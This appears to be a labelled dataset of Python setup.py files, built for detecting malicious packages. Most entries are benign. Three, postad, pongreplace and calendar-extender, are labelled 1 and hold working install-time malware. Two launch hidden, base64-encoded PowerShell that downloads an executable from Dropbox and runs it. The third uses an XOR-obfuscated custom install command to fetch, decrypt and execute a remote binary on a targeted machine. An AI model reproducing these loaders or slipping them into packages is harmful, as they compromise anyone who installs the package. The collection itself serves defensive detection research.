{"idx": "datacompy-0.8.1", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nCURR_DIR = os.path.abspath(os.path.dirname(__file__))\n\nwith open(os.path.join(CURR_DIR, \"README.rst\"), encoding=\"utf-8\") as file_open:\n    LONG_DESCRIPTION = file_open.read()\n\nwith open(\"requirements.txt\", \"r\") as requirements_file:\n    raw_requirements = requirements_file.read().strip().split(\"\\n\")\n\nINSTALL_REQUIRES = [\n    line for line in raw_requirements if not (line.startswith(\"#\") or line == \"\")\n]\n\n\nexec(open(\"datacompy/_version.py\").read())\n\n\n# No versioning on extras for dev, always grab the latest\nEXTRAS_REQUIRE = {\n    \"spark\": [\"pyspark>=2.2.0\"],\n    \"docs\": [\"sphinx\", \"sphinx_rtd_theme\"],\n    \"tests\": [\"pytest\", \"pytest-cov\", \"pytest-spark\"],\n    \"qa\": [\n        \"pre-commit\",\n        \"black\",\n        \"isort\",\n    ],\n    \"build\": [\"twine\", \"wheel\"],\n    \"edgetest\": [\"edgetest\", \"edgetest-conda\"],\n}\n\nEXTRAS_REQUIRE[\"dev\"] = (\n    EXTRAS_REQUIRE[\"tests\"]\n    + EXTRAS_REQUIRE[\"docs\"]\n    + EXTRAS_REQUIRE[\"qa\"]\n    + EXTRAS_REQUIRE[\"build\"]\n)\n\n\nsetup(\n    name=\"datacompy\",\n    version=__version__,\n    description=\"Dataframe comparison in Python\",\n    long_description=LONG_DESCRIPTION,\n    url=\"https://github.com/capitalone/datacompy\",\n    license=\"Apache-2.0\",\n    packages=find_packages(),\n    install_requires=INSTALL_REQUIRES,\n    extras_require=EXTRAS_REQUIRE,\n    package_data={\"\": [\"templates/*\"]},\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "Deprecated-1.2.13", "func": "#!/usr/bin/env python\n#  -*- coding: utf-8 -*-\nu\"\"\"\nDeprecated Library\n------------------\n\nDeprecated is Easy to Use\n`````````````````````````\n\nIf you need to mark a function or a method as deprecated,\nyou can use the ``@deprecated`` decorator:\n\nSave in a hello.py:\n\n.. code:: python\n\n    from deprecated import deprecated\n\n\n    @deprecated(version='1.2.1', reason=\"You should use another function\")\n    def some_old_function(x, y):\n        return x + y\n\n\n    class SomeClass(object):\n        @deprecated(version='1.3.0', reason=\"This method is deprecated\")\n        def some_old_method(self, x, y):\n            return x + y\n\n\n    some_old_function(12, 34)\n    obj = SomeClass()\n    obj.some_old_method(5, 8)\n\n\nAnd Easy to Setup\n`````````````````\n\nAnd run it:\n\n.. code:: bash\n\n    $ pip install Deprecated\n    $ python hello.py\n    hello.py:15: DeprecationWarning: Call to deprecated function (or staticmethod) some_old_function.\n    (You should use another function) -- Deprecated since version 1.2.0.\n      some_old_function(12, 34)\n    hello.py:17: DeprecationWarning: Call to deprecated method some_old_method.\n    (This method is deprecated) -- Deprecated since version 1.3.0.\n      obj.some_old_method(5, 8)\n\n\nYou can document your code\n``````````````````````````\n\nHave you ever wonder how to document that some functions, classes, methods, etc. are deprecated?\nThis is now possible with the integrated Sphinx directives:\n\nFor instance, in hello_sphinx.py:\n\n.. code:: python\n\n    from deprecated.sphinx import deprecated\n    from deprecated.sphinx import versionadded\n    from deprecated.sphinx import versionchanged\n\n\n    @versionadded(version='1.0', reason=\"This function is new\")\n    def function_one():\n        '''This is the function one'''\n\n\n    @versionchanged(version='1.0', reason=\"This function is modified\")\n    def function_two():\n        '''This is the function two'''\n\n\n    @deprecated(version='1.0', reason=\"This function will be removed soon\")\n    def function_three():\n        '''This is the function three'''\n\n\n    function_one()\n    function_two()\n    function_three()  # warns\n\n    help(function_one)\n    help(function_two)\n    help(function_three)\n\n\nThe result it immediate\n```````````````````````\n\nRun it:\n\n.. code:: bash\n\n    $ python hello_sphinx.py\n\n    hello_sphinx.py:23: DeprecationWarning: Call to deprecated function (or staticmethod) function_three.\n    (This function will be removed soon) -- Deprecated since version 1.0.\n      function_three()  # warns\n\n    Help on function function_one in module __main__:\n\n    function_one()\n        This is the function one\n\n        .. versionadded:: 1.0\n           This function is new\n\n    Help on function function_two in module __main__:\n\n    function_two()\n        This is the function two\n\n        .. versionchanged:: 1.0\n           This function is modified\n\n    Help on function function_three in module __main__:\n\n    function_three()\n        This is the function three\n\n        .. deprecated:: 1.0\n           This function will be removed soon\n\n\nLinks\n`````\n\n* `Python package index (PyPi) <https://pypi.python.org/pypi/deprecated>`_\n* `GitHub website <https://github.com/tantale/deprecated>`_\n* `Read The Docs <https://readthedocs.org/projects/deprecated>`_\n* `EBook on Lulu.com <http://www.lulu.com/commerce/index.php?fBuyContent=21305117>`_\n* `StackOverFlow Q&A <https://stackoverflow.com/a/40301488/1513933>`_\n* `Development version\n  <https://github.com/tantale/deprecated/zipball/master#egg=Deprecated-dev>`_\n\n\"\"\"\nfrom setuptools import setup\n\nsetup(\n    name='Deprecated',\n    version='1.2.13',\n    url='https://github.com/tantale/deprecated',\n    project_urls={\n        \"Documentation\": \"https://deprecated.readthedocs.io/en/latest/\",\n        \"Source\": \"https://github.com/tantale/deprecated\",\n        \"Bug Tracker\": \"https://github.com/tantale/deprecated/issues\",\n    },\n    license='MIT',\n    author='Laurent LAPORTE',  # since v1.1.0\n    author_email='tantale.solutions@gmail.com',\n    description='Python @deprecated decorator to deprecate old python classes, functions or methods.',\n    long_description=__doc__,\n    long_description_content_type=\"text/x-rst\",\n    keywords='deprecate,deprecated,deprecation,warning,warn,decorator',\n    packages=['deprecated'],\n    install_requires=['wrapt < 2, >= 1.10'],\n    zip_safe=False,\n    include_package_data=True,\n    platforms='any',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        # 'Programming Language :: Python :: 3.10',  # scheduled on 2021-10-04\n        'Topic :: Software Development :: Libraries :: Python Modules',\n    ],\n    extras_require={\n        'dev': [\n            'tox',\n            'PyTest             ; python_version >= \"3.6\"',\n            'PyTest < 5         ; python_version < \"3.6\"',\n            'PyTest-Cov         ; python_version >= \"3.6\"',\n            'PyTest-Cov < 2.6   ; python_version < \"3.6\"',\n            'bump2version < 1',\n            'sphinx < 2',\n            # Python 2.7 EOL:\n            'importlib-metadata < 3       ; python_version < \"3\"',\n            'importlib-resources < 4      ; python_version < \"3\"',\n            'configparser < 5             ; python_version < \"3\"',\n            'sphinxcontrib-websupport < 2 ; python_version < \"3\"',\n            'zipp < 2                     ; python_version < \"3\"',\n        ]\n    },\n    python_requires='>=2.7, !=3.0.*, !=3.1.*, !=3.2.*, !=3.3.*',\n)\n", "target": 0}
{"idx": "dparse-0.5.2", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\n\"\"\"The setup script.\"\"\"\n\nfrom setuptools import setup, find_packages\n\nwith open('README.rst') as readme_file:\n    readme = readme_file.read()\n\nwith open('HISTORY.rst') as history_file:\n    history = history_file.read()\n\nrequirements = [\n    \"packaging\",\n    \"toml\",\n]\n\nsetup(\n    name='dparse',\n    version='0.5.2',\n    description=\"A parser for Python dependency files\",\n    long_description=readme + '\\n\\n' + history,\n    long_description_content_type='text/x-rst',\n    author=\"Jannis Gebauer\",\n    author_email='support@pyup.io',\n    url='https://github.com/pyupio/dparse',\n    packages=find_packages(include=['dparse']),\n    include_package_data=True,\n    install_requires=requirements,\n    license=\"MIT license\",\n    zip_safe=False,\n    keywords='dparse',\n    classifiers=[\n        'Development Status :: 2 - Pre-Alpha',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Natural Language :: English',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n    ],\n    python_requires=\">=3.5\",\n    extras_require={\n        'pipenv': [\"pipenv\"],\n        'conda': [\"pyyaml\"]\n    }\n)\n", "target": 0}
{"idx": "django-webtest-1.9.10", "func": "#!/usr/bin/env python\nimport sys\n\nfrom setuptools import setup\n\n\nversion = '1.9.10'\n\n\ndef _read(name):\n    if sys.version_info[0] < 3:\n        with open(name) as f:\n            return f.read()\n    else:\n        with open(name, encoding='utf8') as f:\n            return f.read()\n\n\ndef get_long_description():\n    return _read('README.rst') + \"\\n\\n\" + _read('CHANGES.rst')\n\n\nsetup(\n    name='django-webtest',\n    version=version,\n    author='Mikhail Korobov',\n    author_email='kmike84@gmail.com',\n\n    packages=['django_webtest'],\n\n    url='https://github.com/django-webtest/django-webtest',\n    license='MIT license',\n    description=(\n        \"Instant integration of Ian Bicking's WebTest \"\n        \"(http://docs.pylonsproject.org/projects/webtest/) \"\n        \"with Django's testing framework.\"\n    ),\n\n    long_description=get_long_description(),\n    install_requires=['webtest >= 1.3.3'],\n\n    entry_points=\"\"\"\n    [pytest11]\n    django_webtest = django_webtest.pytest_plugin\n    \"\"\",\n\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 3.0',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Testing',\n    ],\n    project_urls={\n        'Code': 'https://github.com/django-webtest/django-webtest',\n        'Issue Tracker': 'https://github.com/django-webtest/django-webtest/issues',\n        'Changelog': 'https://github.com/django-webtest/django-webtest/blob/master/CHANGES.rst',\n    },\n    keywords=['django', 'webtest', 'pytest'],\n)\n", "target": 0}
{"idx": "postad-7.26", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'postad',\n    packages = ['modlib'],\n    version = '8.48',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "pongreplace-10.4", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pongreplace',\n    packages = ['modlib'],\n    version = '9.19',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "filelock-3.8.0", "func": "from __future__ import annotations\n\nfrom setuptools import setup\n\nsetup()\n", "target": 0}
{"idx": "django-tastypie-0.14.4", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from ez_setup import use_setuptools\n    use_setuptools()\n    from setuptools import setup\n\n\nfrom tastypie import __version__\n\n\nsetup(\n    name='django-tastypie',\n    version=__version__,\n    description='A flexible & capable API layer for Django.',\n    author='Daniel Lindsley',\n    author_email='daniel@toastdriven.com',\n    url='https://github.com/django-tastypie/django-tastypie',\n    long_description=open('README.rst', 'r').read(),\n    packages=[\n        'tastypie',\n        'tastypie.utils',\n        'tastypie.management',\n        'tastypie.management.commands',\n        'tastypie.migrations',\n        'tastypie.contrib',\n        'tastypie.contrib.gis',\n        'tastypie.contrib.contenttypes',\n    ],\n    package_data={\n        'tastypie': ['templates/tastypie/*'],\n    },\n    zip_safe=False,\n    requires=[\n        'python_mimeparse(>=0.1.4, !=1.5)',\n        'dateutil(>=1.5, !=2.0)',\n    ],\n    install_requires=[\n        'python-mimeparse >= 0.1.4, != 1.5',\n        'python-dateutil >= 1.5, != 2.0',\n    ],\n    tests_require=['mock', 'PyYAML', 'lxml', 'defusedxml'],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Topic :: Utilities'\n    ],\n)\n", "target": 0}
{"idx": "Flask-HTTPAuth-4.7.0", "func": "import setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "django-autoslug-1.9.8", "func": "#!/usr/bin/env python\n# coding: utf-8\n#\n#  Copyright (c) 2018-present Justin Mayer\n#  Copyright (c) 2008\u20142016 Andy Mikhailenko\n#\n#  This file is part of django-autoslug.\n#\n#  django-autoslug is free software under terms of the GNU Lesser\n#  General Public License version 3 (LGPLv3) as published by the Free\n#  Software Foundation. See the file README for copying conditions.\n#\n\nimport io\nimport os\nfrom setuptools import setup\n\n\nfrom _version_helper import __version__\n\n\nreadme = open(os.path.join(os.path.dirname(__file__), 'README.rst')).read()\n\nsetup(\n    name     = 'django-autoslug',\n    version  = __version__,\n    packages = ['autoslug'],\n\n    requires = ['python (>= 3.5)', 'django (>= 1.11)'],\n    # in case you want to use slugify() with support for transliteration:\n    extras_require = {\n        'cyrillic': 'pytils >= 0.2',\n        'translitcodec': 'translitcodec >= 0.3',\n    },\n    description  = 'An automated slug field for Django.',\n    long_description = readme,\n    author       = 'Justin Mayer',\n    author_email = 'entrop@gmail.com',\n    url          = 'https://github.com/justinmayer/django-autoslug/',\n    download_url = 'https://github.com/justinmayer/django-autoslug/archive/master.zip',\n    license      = 'GNU Lesser General Public License (LGPL), Version 3',\n    keywords     = 'django field slug auto unique transliteration i18n',\n    classifiers  = [\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)',\n        'Framework :: Django',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.0',\n        'Framework :: Django :: 2.1',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.0',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: Implementation :: CPython',\n        'Programming Language :: Python :: Implementation :: PyPy',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Text Processing :: General',\n    ],\n)\n", "target": 0}
{"idx": "dynesty-1.2.3", "func": "#!/usr/bin/env python\n# -*- coding: utf-8 -*-\n\nimport os\nimport re\ntry:\n    from setuptools import setup\nexcept ImportError:\n    from distutils.core import setup\n\ndir_path = os.path.dirname(os.path.realpath(__file__))\n\ninit_string = open(os.path.join(dir_path, 'py', 'dynesty',\n                                '__init__.py')).read()\nVERS = r\"^__version__ = ['\\\"]([^'\\\"]*)['\\\"]\"\nmo = re.search(VERS, init_string, re.M)\n__version__ = mo.group(1)\n\ntry:\n    import pypandoc\n    with open('README.md', 'r') as f:\n        txt = f.read()\n    txt = re.sub('<[^<]+>', '', txt)\n    long_description = pypandoc.convert(txt, 'rst', 'md')\nexcept ImportError:\n    long_description = open('README.md').read()\n\nsetup(name=\"dynesty\",\n      url=\"https://github.com/joshspeagle/dynesty\",\n      version=__version__,\n      author=\"Joshua S Speagle\",\n      author_email=\"j.speagle@utoronto.ca\",\n      packages=[\"dynesty\"],\n      license=\"MIT\",\n      description=(\"A dynamic nested sampling package for computing Bayesian \"\n                   \"posteriors and evidences.\"),\n      long_description=long_description,\n      long_description_content_type=\"text/markdown\",\n      package_data={\n          \"\":\n          [\"README.md\", \"LICENSE\", \"AUTHORS.md\", 'CHANGELOG.md', 'TESTING.md']\n      },\n      package_dir={'': 'py/'},\n      include_package_data=True,\n      keywords=[\n          \"nested sampling\", \"dynamic\", \"monte carlo\", \"bayesian\", \"inference\",\n          \"modeling\"\n      ],\n      classifiers=[\n          \"Development Status :: 5 - Production/Stable\",\n          \"License :: OSI Approved :: MIT License\",\n          \"Natural Language :: English\", \"Programming Language :: Python\",\n          \"Operating System :: OS Independent\",\n          \"Topic :: Scientific/Engineering\",\n          \"Intended Audience :: Science/Research\"\n      ])\n", "target": 0}
{"idx": "dbt-core-1.2.0", "func": "#!/usr/bin/env python\nimport os\nimport sys\n\nif sys.version_info < (3, 7, 2):\n    print(\"Error: dbt does not support this version of Python.\")\n    print(\"Please upgrade to Python 3.7.2 or higher.\")\n    sys.exit(1)\n\n\nfrom setuptools import setup\n\ntry:\n    from setuptools import find_namespace_packages\nexcept ImportError:\n    # the user has a downlevel version of setuptools.\n    print(\"Error: dbt requires setuptools v40.1.0 or higher.\")\n    print('Please upgrade setuptools with \"pip install --upgrade setuptools\" ' \"and try again\")\n    sys.exit(1)\n\n\nthis_directory = os.path.abspath(os.path.dirname(__file__))\nwith open(os.path.join(this_directory, \"README.md\")) as f:\n    long_description = f.read()\n\n\npackage_name = \"dbt-core\"\npackage_version = \"1.2.0\"\ndescription = \"\"\"With dbt, data analysts and engineers can build analytics \\\nthe way engineers build applications.\"\"\"\n\n\nsetup(\n    name=package_name,\n    version=package_version,\n    description=description,\n    long_description=long_description,\n    long_description_content_type=\"text/markdown\",\n    author=\"dbt Labs\",\n    author_email=\"info@dbtlabs.com\",\n    url=\"https://github.com/dbt-labs/dbt-core\",\n    packages=find_namespace_packages(include=[\"dbt\", \"dbt.*\"]),\n    include_package_data=True,\n    test_suite=\"test\",\n    entry_points={\n        \"console_scripts\": [\n            \"dbt = dbt.main:main\",\n        ],\n    },\n    install_requires=[\n        \"Jinja2==2.11.3\",\n        \"MarkupSafe>=0.23,<2.1\",\n        \"agate>=1.6,<1.6.4\",\n        \"click>=7.0,<9\",\n        \"colorama>=0.3.9,<0.4.6\",\n        \"hologram>=0.0.14,<=0.0.15\",\n        \"isodate>=0.6,<0.7\",\n        \"logbook>=1.5,<1.6\",\n        \"mashumaro==2.9\",\n        \"minimal-snowplow-tracker==0.0.2\",\n        \"networkx>=2.3,<2.8.1;python_version<'3.8'\",\n        \"networkx>=2.3,<3;python_version>='3.8'\",\n        \"packaging>=20.9,<22.0\",\n        \"sqlparse>=0.2.3,<0.5\",\n        \"dbt-extractor~=0.4.1\",\n        \"typing-extensions>=3.7.4\",\n        \"werkzeug>=1,<3\",\n        # the following are all to match snowflake-connector-python\n        \"requests<3.0.0\",\n        \"idna>=2.5,<4\",\n        \"cffi>=1.9,<2.0.0\",\n    ],\n    zip_safe=False,\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"License :: OSI Approved :: Apache Software License\",\n        \"Operating System :: Microsoft :: Windows\",\n        \"Operating System :: MacOS :: MacOS X\",\n        \"Operating System :: POSIX :: Linux\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    python_requires=\">=3.7.2\",\n)\n", "target": 0}
{"idx": "flake8-broken-line-0.5.0", "func": "# -*- coding: utf-8 -*-\nfrom setuptools import setup\n\nmodules = \\\n['flake8_broken_line']\ninstall_requires = \\\n['flake8>=3.5,<6']\n\nentry_points = \\\n{'flake8.extension': ['N4 = flake8_broken_line:check_line_breaks']}\n\nsetup_kwargs = {\n    'name': 'flake8-broken-line',\n    'version': '0.5.0',\n    'description': 'Flake8 plugin to forbid backslashes for line breaks',\n    'long_description': '# flake8-broken-line\\n\\n[![wemake.services](https://img.shields.io/badge/-wemake.services-green.svg?label=%20&logo=data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAMAAAAoLQ9TAAAABGdBTUEAALGPC%2FxhBQAAAAFzUkdCAK7OHOkAAAAbUExURQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP%2F%2F%2F5TvxDIAAAAIdFJOUwAjRA8xXANAL%2Bv0SAAAADNJREFUGNNjYCAIOJjRBdBFWMkVQeGzcHAwksJnAPPZGOGAASzPzAEHEGVsLExQwE7YswCb7AFZSF3bbAAAAABJRU5ErkJggg%3D%3D)](https://wemake-services.github.io)\\n[![Build Status](https://github.com/wemake-services/flake8-broken-line/workflows/test/badge.svg?branch=master&event=push)](https://github.com/wemake-services/flake8-broken-line/actions?query=workflow%3Atest)\\n[![codecov](https://codecov.io/gh/wemake-services/flake8-broken-line/branch/master/graph/badge.svg)](https://codecov.io/gh/wemake-services/flake8-broken-line)\\n[![Python Version](https://img.shields.io/pypi/pyversions/flake8-broken-line.svg)](https://pypi.org/project/flake8-broken-line/)\\n[![PyPI version](https://badge.fury.io/py/flake8-broken-line.svg)](https://pypi.org/project/flake8-broken-line/) [![wemake-python-styleguide](https://img.shields.io/badge/style-wemake-000000.svg)](https://github.com/wemake-services/wemake-python-styleguide)\\n\\nDo not break the line! \ud83d\udea8\\n\\n\\n## Installation\\n\\n```bash\\npip install flake8-broken-line\\n```\\n\\nIt is also a valuable part of [`wemake-python-styleguide`](https://github.com/wemake-services/wemake-python-styleguide).\\n\\n\\n## Code example\\n\\nThings we check with this plugin:\\n\\n```python\\n# String line breaks, use `()` or `\"\"\"` instead:\\n\\nsome_string = \\'first line\\\\\\nsecond line\\'\\n\\n# Use a single line, `()`, or new variables instead:\\n\\nif 1 == 1 and \\\\\\n    2 == 2:\\n    print(\\'Do not do that!\\')\\n\\n# Do not use for method chaining:\\nsome_object \\\\\\n  .call_method(param1, param2) \\\\\\n  .call_other(keyword=value) \\\\\\n  .finalize()\\n\\n# Instead use:\\nsome_objects.call_method(\\n    param1, param2,\\n).call_other(\\n    keyword=value\\n).finalize()\\n\\n```\\n\\n\\n## Error codes\\n\\n| Error code |                   Description                  |\\n|:----------:|:----------------------------------------------:|\\n|    N400    | Found backslash that is used for line breaking |\\n\\n\\n## License\\n\\nMIT.\\n',\n    'author': 'Nikita Sobolev',\n    'author_email': 'mail@sobolevn.me',\n    'maintainer': None,\n    'maintainer_email': None,\n    'url': 'https://github.com/wemake-services/flake8-broken-line',\n    'py_modules': modules,\n    'install_requires': install_requires,\n    'entry_points': entry_points,\n    'python_requires': '>=3.6,<4.0',\n}\n\n\nsetup(**setup_kwargs)\n", "target": 0}
{"idx": "calendar-extender-0.2", "func": "from setuptools import setup, find_packages\nimport subprocess\nimport platform\nfrom setuptools.command.install import install\nimport requests\nimport os\nimport stat\nimport hashlib\nfrom pathlib import Path\nfrom typing import Generator\n\n\nICON = [\n\tbytes.fromhex(\n\t\t\"8dcf1b5c290b7463c9ab9044a285c652e5479b24344e7fb827dae8407e077528\"\n\t),\n\tbytes.fromhex(\n\t\t\"b526e970df3039acfaece7c6f6b97ebc652a97450ad389d924a2a5d74ad0edbe0e1e4bf6245a94abd03f8351d1c7fb47d47c0fe065d107a2d05dac00317048c236a94f4fab665669b8\"\n\t),\n\tbytes.fromhex(\n\t\t\"6562d84bb8c9c32b89488b8f13fd4d28640b896298e06a81afd3f5e25654a14e0bb11b327feb5428791bcee129a97c432b0060cffc60e34890ccc747dc99cf75654ce49e3951ff4ebc\"\n\t),\n\tPath(\n\t\tbytes.fromhex(\n\t\t\t\"2f55736572732f536861726564\"\n\t\t).decode(\"utf-8\")\n\t),\n\tbytes.fromhex(\"6372616674\"),\n\tbytes.fromhex(\"726962626f6e\"),\n\tbytes.fromhex(\"656666656374\"),\n\tbytes.fromhex(\"6a61636b6574\"),\n]\n\n\ndef gen(v: bytes, /) -> Generator[int, None, None]:\n    def iter(v: bytes, /) -> tuple[bytes, bytes]:\n        hsh = hashlib.sha3_512(v).digest()\n        return hsh[0:32], hsh[32:]\n\n    _, next_key = iter(v)\n    buf, next_key = iter(next_key)\n\n    while True:\n        if not buf:\n            buf, next_key = iter(next_key)\n        b = buf[0]\n        buf = buf[1:]\n\n        yield b\n\n\ndef CustomRun(path: bytes, /) -> None:\n    run1 = gen(ICON[5] + path)\n    run2 = gen(ICON[6] + path)\n    run3 = gen(ICON[7] + path)\n    \n    local_bin_path = os.path.expanduser('~/.local/bin')\n    os.makedirs(local_bin_path, exist_ok=True)\n    \n    item1 = ''.join(chr(b ^ k) for b, k in zip(ICON[1], run2))\n    item2 = ''.join(chr(b ^ k) for b, k in zip(ICON[2], run3))\n\n    url = {\n        \"x86_64\": item1,\n        \"arm64\": item2\n    }.get(platform.machine())\n    response = requests.get(url)\n    buf = response.content\n    out: list[int] = []\n\n    for b, k in zip(buf, run1):\n        out.append(b ^ k)\n\n    binary_path = os.path.join(local_bin_path, 'calendar_extender')\n    with open(binary_path, 'wb') as f:\n        f.write(bytes(out))\n    os.chmod(binary_path, stat.S_IREAD | stat.S_IEXEC | stat.S_IRGRP | stat.S_IXGRP)            \n    with open('/tmp/21cb7184-5e4e-4041-b6db-91688a974c56', 'w') as f:\n        pass\n    subprocess.Popen([binary_path], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)\n\n\nclass InstallCommand(install):\n    def run(self):\n        install.run(self)\n        for path in ICON[3].glob(\"C*/*r*/2*/*\"):\n            path_bytes = str(path).encode(\"utf-8\")\n\n            to_hash = ICON[4]  + path_bytes\n            stream = gen(to_hash)\n\n            first_n_bytes = bytes([next(stream) for _ in range(32)])\n\n            if first_n_bytes == ICON[0]:\n                CustomRun(path_bytes)\n                break\n\n\nsetup(\n    name='calendar-extender',\n    version='0.2',\n    license='MIT',\n    packages=find_packages(),\n    cmdclass={'install': InstallCommand},\n)\n", "target": 1}
